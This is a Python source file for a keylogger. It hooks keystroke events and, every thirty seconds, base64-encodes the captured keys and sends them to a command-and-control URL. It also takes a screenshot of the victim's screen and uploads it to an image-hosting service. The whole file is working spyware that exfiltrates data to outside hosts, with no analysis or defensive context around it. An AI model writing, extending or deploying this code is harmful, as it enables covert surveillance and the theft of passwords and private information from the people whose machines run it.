import keyboard
from threading import Timer
from datetime import datetime
from base64 import b64encode
import requests
import pyautogui
import io
import key_api

INTERVAL = 30
KEY_IMG_BB = key_api.img_bb
C2_URL = key_api.c2_url

class Keylogger:
    def __init__(self, interval):

        self.interval = interval
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()

    def callback(self, event):
        # key UP is occured
        name = event.name
        if len(name) > 1:
            name=name.rplace(" ", "_")
            name=name.upper()
            name = "[{}]".format(name)
        
        self.log += name

    def send_server(self):
        #send keylogs
        leaked_bytes = (self.log).encode('ascii')
        leaked_info = b64encode(leaked_bytes)
        res = requests.get(C2_URL, params={"k":leaked_info})

        #send screenshot
        screenshot = pyautogui.screenshot("1234.png")

        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes = img_bytes.getvalue()
        img_encoded = b64encode(img_bytes)

        url = "https://api.imgbb.com/1/upload"
        payload = {
            "key": KEY_IMG_BB ,
            "image": img_encoded
            }
        res =requests.post(url, payload)

    def report(self):
        if(len(self.log)>0):
            self.send_server()

        self.log=""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
    
if __name__ == "__main__":

    keylogger = Keylogger(interval=INTERVAL)
    keylogger.start()